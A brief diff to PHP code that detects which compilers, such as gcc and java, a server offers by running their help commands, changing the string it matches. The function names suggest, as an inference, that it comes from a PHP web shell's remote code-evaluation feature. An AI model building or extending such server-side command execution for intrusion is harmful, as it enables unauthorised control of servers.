@@ -799,9 +799,9 @@ if(!function_exists('eval_get_supported')){
 		if(strpos($check,"usage")!==false) $eval_supported[] = "gcc";
 
 		$check = strtolower(execute("java -help"));
-		if(strpos($check,"usage")!==false){
+		if(strpos($check,"-classpath")!==false){
 			$check = strtolower(execute("javac -help"));
-			if(strpos($check,"usage")!==false) $eval_supported[] = "java";
+			if(strpos($check,"-classpath")!==false) $eval_supported[] = "java";
 		}
 
 		return implode(",", $eval_supported);
